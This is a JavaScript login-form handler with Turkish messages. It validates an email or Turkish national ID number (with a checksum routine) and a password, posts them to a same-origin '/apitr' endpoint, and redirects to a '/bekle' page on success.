document.querySelectorAll('#trname, #trpass').forEach((input) => {
  input.addEventListener('input', function () {
      if (this.value.length > 30) {
          this.value = this.value.slice(0, 30); 
      }
  });
});

document.querySelector('.sensors-login').addEventListener('click', function () {
  const emailOrTcInput = document.querySelector('#trname');
  const passwordInput = document.querySelector('#trpass');
  const emailOrTcError = emailOrTcInput.nextElementSibling;
  const passwordError = passwordInput.nextElementSibling;

  const emailOrTcValue = emailOrTcInput.value.trim();
  const passwordValue = passwordInput.value.trim();

  let isValid = true;

  emailOrTcError.style.display = 'none';
  passwordError.style.display = 'none';

  const isEmailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailOrTcValue);
  const isTcValid = tcno_dogrula(emailOrTcValue);

  if (!isEmailValid && !isTcValid) {
      emailOrTcError.style.display = 'block';
      emailOrTcError.textContent = 'Lütfen geçerli bir e-posta veya TCKN girin.';
      isValid = false;
  }

  const isPasswordValid = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$/.test(passwordValue);

  if (!isPasswordValid) {
      passwordError.style.display = 'block';
      passwordError.textContent =
          'En az 8 karakterden oluşmalı ve en az bir büyük harf, bir küçük harf ve bir rakam içermelidir.';
      isValid = false;
  }

  if (!isValid) return;

  const data = {
      emailOrTc: emailOrTcValue,
      password: passwordValue,
  };

  fetch('/apitr', {
      method: 'POST',
      headers: {
          'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
  })
      .then((response) => {
          if (!response.ok) {
              throw new Error('POST isteği başarısız oldu');
          }
          return response.json();
      })
      .then((responseData) => {
          if (responseData.successful) {
              window.location.href = '/bekle';
          } else {
              alert('Oturum açma başarısız: ' + (responseData.message || 'Bilinmeyen hata.'));
          }
      })
      .catch((error) => {
          console.error('Hata:', error);
          alert('Bir hata oluştu, lütfen tekrar deneyin.');
      });
});

function tcno_dogrula(tcno) {
  tcno = String(tcno);
  if (tcno.substring(0, 1) === '0' || tcno.length !== 11) return false;

  let ilkon_array = tcno.substr(0, 10).split('');
  let ilkon_total = 0,
      hane_tek = 0,
      hane_cift = 0;

  for (let i = 0; i < 9; ++i) {
      const digit = parseInt(ilkon_array[i], 10);
      if (i % 2 === 0) hane_tek += digit;
      else hane_cift += digit;
      ilkon_total += digit;
  }

  if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno[9], 10)) return false;

  ilkon_total += parseInt(ilkon_array[9], 10);
  if (ilkon_total % 10 !== parseInt(tcno[10], 10)) return false;

  return true;
}